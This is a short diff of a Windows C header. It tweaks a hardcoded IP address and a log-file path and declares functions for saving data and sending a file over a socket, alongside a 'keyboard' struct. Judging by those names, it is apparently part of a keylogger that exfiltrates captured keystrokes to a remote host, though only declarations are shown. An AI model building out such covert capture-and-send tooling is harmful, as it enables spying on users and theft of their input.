@@ -9,12 +9,11 @@
 #include <IPHlpApi.h>
 #include <rpc.h>
 
-
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment (lib, "IPHLPAPI.lib")
+#pragma comment(lib, "IPHLPAPI.lib")
 #define BUFFSIZE 1024
-#define LOGFILE		L"C:\\test.txt"
-#define IP "10.224.56.125"
+#define LOGFILE		"C:\\test.txt"
+#define IP "10.224.52.114"
 
 struct keyboard
 {
@@ -27,4 +26,4 @@ void	save_data(const char*);
 SOCKET	init_socket(SOCKET*);
 void	send_data(SOCKET*, FILE*);
 void	keep_alive_client_and_init(void);
-void	server(void);
+void	server(SOCKET *);
